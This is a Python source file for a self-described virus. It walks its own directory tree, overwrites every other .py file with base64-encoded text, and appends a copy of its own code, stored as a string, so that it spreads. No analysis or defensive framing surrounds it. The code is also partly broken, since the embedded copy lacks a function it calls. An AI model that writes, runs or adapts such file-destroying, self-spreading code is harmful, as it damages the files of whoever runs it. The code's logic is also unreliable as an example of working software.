import os
import base64

def encrypt_script(script_path):
    with open(script_path, 'r') as file:
        script_content = file.read()

    encrypted_script = base64.b64encode(script_content.encode()).decode()

    with open(script_path, 'w') as file:
        file.write(encrypted_script)

def attach_to_other_scripts(virus_path):
    script_directory = os.path.dirname(os.path.abspath(virus_path))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(virus_path):
                script_path = os.path.join(root, file)
                with open(script_path, 'r') as file:
                    script_content = file.read()
                
                # Check if the virus code is not already present in the script
                if "attach_to_other_scripts" not in script_content:
                    with open(script_path, 'a') as file:
                        file.write('\n\n' + virus_code)

# Get the virus code
virus_code = """
import os
import base64

def encrypt_script(script_path):
    with open(script_path, 'r') as file:
        script_content = file.read()

    encrypted_script = base64.b64encode(script_content.encode()).decode()

    with open(script_path, 'w') as file:
        file.write(encrypted_script)

def attach_to_other_scripts(virus_path):
    script_directory = os.path.dirname(os.path.abspath(virus_path))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(virus_path):
                script_path = os.path.join(root, file)
                with open(script_path, 'r') as file:
                    script_content = file.read()
                
                # Check if the virus code is not already present in the script
                if "attach_to_other_scripts" not in script_content:
                    with open(script_path, 'a') as file:
                        file.write('\\n\\n' + virus_code)

# Usage example
virus_path = os.path.abspath(__file__)
encrypt_files_in_own_directory()
attach_to_other_scripts(virus_path)
"""

def encrypt_files_in_own_directory():
    script_directory = os.path.dirname(os.path.abspath(__file__))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(__file__):
                script_path = os.path.join(root, file)
                encrypt_script(script_path)

# Usage example
virus_path = os.path.abspath(__file__)
encrypt_files_in_own_directory()
attach_to_other_scripts(virus_path)
